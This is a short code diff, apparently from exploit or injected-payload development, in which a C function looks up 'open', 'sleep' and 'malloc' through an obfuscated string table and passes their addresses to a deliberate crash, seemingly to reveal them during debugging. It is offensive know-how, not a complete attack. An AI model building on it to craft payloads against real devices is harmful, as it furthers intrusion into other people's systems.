@@ -131,11 +131,11 @@ int c_start(uint64_t* array_ptr) {
     print(path);
     print(getString(455)); // log "Hello, world!" to log.txt
     
-    void* libsystem_kernel_handle = dlopen(getString(218), RTLD_NOW); // dlopen libsystem_kernel
-    void* sym = dlsym(libsystem_kernel_handle, getString(59)); // getString(59) = "open"
-    uint64_t sym_addr = (uint64_t)sym;
+    void* dlsym_open = dlsym(RTLD_DEFAULT, getString(59)); // getString(59) = "open"
+    void* dlsym_sleep = dlsym(RTLD_DEFAULT, getString(1)); // getString(1) = "sleep"
+    void* dlsym_malloc = dlsym(RTLD_DEFAULT, getString(8)); // getString(8) = "malloc"
     
     sleep(10);
-    crash(0,0,(uint64_t)libsystem_kernel_handle,sym_addr,sym_addr,array[15],array[16],array[17],array[13],array[14]);
+    crash(0,0,(uint64_t)dlsym_open,(uint64_t)dlsym_sleep,(uint64_t)dlsym_malloc,0,0,0,0,0);
     return 0;
 }
